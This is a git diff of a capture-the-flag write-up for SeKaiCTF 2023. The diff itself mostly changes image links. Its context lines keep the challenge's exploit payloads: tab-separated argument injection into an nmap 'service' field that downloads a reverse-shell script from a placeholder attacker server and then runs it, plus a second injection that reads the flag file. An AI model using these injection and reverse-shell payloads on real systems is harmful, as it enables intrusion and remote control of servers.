@@ -181,7 +181,6 @@ print(r.text)
 chunked
 
 ```bash
-
 import socket
 import requests
 import json
@@ -270,7 +269,7 @@ POST / HTTP/1.1
 service=OUR_REMOTE_SERVER_IP%3A80%09--script%09http-fetch%09--script-args%09http-fetch.destination%3D/tmp/%2Chttp-fetch.url%3D/reverse_shell.nse
 ```
 
-![Untitled](SeKaiCTF%202023%20be17c3b183c74bff9807233f17bd749e/Untitled.png)
+![Untitled](https://api.2h0ng.wiki:443/noteimages/2024/01/21/18-10-39-82301c0270ea6c64b96b2f2de0690be4.png)
 
 3、Execute the script just downloaded at the target server to get a shell.
 
@@ -287,9 +286,9 @@ POST / HTTP/1.1
 service=OUR_REMOTE_SERVER_IP%3A80%09--script%3D%2Ftmp/OUR_REMOTE_SERVER_IP%2F80%2Freverse_shell.nse
 ```
 
-![Untitled](SeKaiCTF%202023%20be17c3b183c74bff9807233f17bd749e/Untitled%201.png)
+![Untitled](https://api.2h0ng.wiki:443/noteimages/2024/01/21/18-10-39-6b7bc474c7d9c1a6699772907b4da1df.png)
 
-![Untitled](SeKaiCTF%202023%20be17c3b183c74bff9807233f17bd749e/Untitled%202.png)
+![Untitled](https://api.2h0ng.wiki:443/noteimages/2024/01/21/18-10-39-eef5239ef6d2d0d00478dd582b853d60.png)
 
 ## Solution 2:
 
@@ -297,7 +296,7 @@ service=OUR_REMOTE_SERVER_IP%3A80%09--script%3D%2Ftmp/OUR_REMOTE_SERVER_IP%2F80%
 --script http-enum --script-args-file /flag-????????????????????????????????.txt -vvvvvv -dddddd
 ```
 
-![Untitled](SeKaiCTF%202023%20be17c3b183c74bff9807233f17bd749e/Untitled%203.png)
+![Untitled](https://api.2h0ng.wiki:443/noteimages/2024/01/21/18-10-39-0b2ca9c338d8ad07eb150f9645f8be9e.png)
 
 # Golf-jail
 
